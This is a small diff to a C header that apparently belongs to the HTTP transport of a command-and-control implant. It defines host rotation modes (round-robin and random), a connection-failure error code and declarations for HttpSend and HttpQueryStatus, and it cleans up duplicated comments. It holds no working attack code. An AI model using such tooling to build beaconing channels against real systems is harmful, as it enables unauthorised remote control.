@@ -10,6 +10,7 @@
 
 #define TRANSPORT_HTTP_ROTATION_ROUND_ROBIN  0
 #define TRANSPORT_HTTP_ROTATION_RANDOM       1
+#define ERROR_INTERNET_CANNOT_CONNECT        12029
 
 typedef struct _HOST_DATA
 {
@@ -66,19 +67,13 @@ PHOST_DATA HostRandom();
  */
 BOOL HostCheckup();
 
-/*!
- * Query the Http Status code from the request response.
- * @param hRequest
- * @return Http status code
- */
+
 DWORD HttpQueryStatus( HANDLE hRequest );
 
-/*!
- * Query the Http Status code from the request response.
- * @param hRequest
- * @return Http status code
- */
-BOOL HttpSend( PBUFFER Send, PBUFFER Response );
+BOOL HttpSend(
+    _In_      PBUFFER Send,
+    _Out_opt_ PBUFFER Resp
+);
 
 #endif
 
